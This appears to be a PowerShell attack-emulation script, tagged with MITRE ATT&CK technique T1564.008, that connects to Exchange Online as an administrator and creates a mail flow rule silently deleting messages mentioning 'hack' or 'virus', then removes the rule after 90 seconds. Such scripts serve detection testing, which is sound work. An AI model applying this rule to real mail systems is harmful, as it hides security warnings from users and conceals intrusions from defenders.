<#
.SYNOPSIS
Connect to Exchange Online PowerShell module as an administrator and set up a mail flow rule to silently delete messages regarding hacks or viruses

.DESCRIPTION
TA0005: Defense evasion
T1564.008: Email Hiding Rules
2nd attack method
#>

Get-Module | Where-Object name -eq connect-exo | Remove-Module -Verbose
Import-Module ../APIs/connect-EXO.psm1
Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1

# We use the ews environment variables
Import-Environment "exops.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "https://outlook.office.com/Exchange.Manage"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:EXOPS_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:EXOPS_DELEGATE_REDIRECT_URI }

Connect-ExchangeOnline -accessToken $accessToken -Organization $env:TENANT_ID

$rand = Get-Random -Minimum 1000 -Maximum 9999
$rule = New-TransportRule -Name "TA0005 - T1564.008 - 2 - $rand" -SubjectOrBodyContainsWords @("hack", "virus") -DeleteMessage $True

# Also does cleanup
Write-Host "Done, now waiting 90 seconds and then reversing..."
Wait-KeyOrTimeOut -Timeout 90000
Remove-TransportRule -Identity ([string]$rule.Identity) -Confirm:$False
